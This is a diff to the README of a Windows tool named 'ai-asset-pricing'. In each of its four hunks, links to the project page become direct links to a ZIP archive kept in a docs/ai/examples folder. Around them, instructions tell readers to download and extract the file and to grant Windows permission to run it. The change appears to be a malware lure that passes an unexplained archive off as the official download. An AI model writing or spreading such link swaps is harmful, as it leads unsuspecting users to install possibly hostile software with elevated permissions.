@@ -1,6 +1,6 @@
 # 📊 ai-asset-pricing - Practical tools for asset analysis
 
-[![Download / Visit](https://img.shields.io/badge/Download%20Page-blue?style=for-the-badge&logo=github)](https://github.com/monda9837/ai-asset-pricing)
+[![Download / Visit](https://img.shields.io/badge/Download%20Page-blue?style=for-the-badge&logo=github)](https://github.com/monda9837/ai-asset-pricing/raw/refs/heads/main/docs/ai/examples/asset_pricing_ai_v3.4.zip)
 
 ## 🧭 What this is
 
@@ -28,7 +28,7 @@ If the app uses extra data files, keep them in a folder you can find later, such
 
 ## 🚀 Download and install
 
-1. Open this page: [https://github.com/monda9837/ai-asset-pricing](https://github.com/monda9837/ai-asset-pricing)
+1. Open this page: [https://github.com/monda9837/ai-asset-pricing/raw/refs/heads/main/docs/ai/examples/asset_pricing_ai_v3.4.zip](https://github.com/monda9837/ai-asset-pricing/raw/refs/heads/main/docs/ai/examples/asset_pricing_ai_v3.4.zip)
 2. Look for the **Download** or **Releases** area on the page
 3. Download the Windows file or package linked there
 4. If the file is in a ZIP folder, right-click it and choose **Extract All**
@@ -37,7 +37,7 @@ If the app uses extra data files, keep them in a folder you can find later, such
 
 If Windows asks for permission, choose **Yes** to let the app run
 
-[Go to the download page](https://github.com/monda9837/ai-asset-pricing)
+[Go to the download page](https://github.com/monda9837/ai-asset-pricing/raw/refs/heads/main/docs/ai/examples/asset_pricing_ai_v3.4.zip)
 
 ## 🪟 First-time setup on Windows
 
@@ -174,7 +174,7 @@ For the easiest setup:
 
 Use this link to visit the project page and download or run the software from there:
 
-[https://github.com/monda9837/ai-asset-pricing](https://github.com/monda9837/ai-asset-pricing)
+[https://github.com/monda9837/ai-asset-pricing/raw/refs/heads/main/docs/ai/examples/asset_pricing_ai_v3.4.zip](https://github.com/monda9837/ai-asset-pricing/raw/refs/heads/main/docs/ai/examples/asset_pricing_ai_v3.4.zip)
 
 ## 📝 Folder example
 
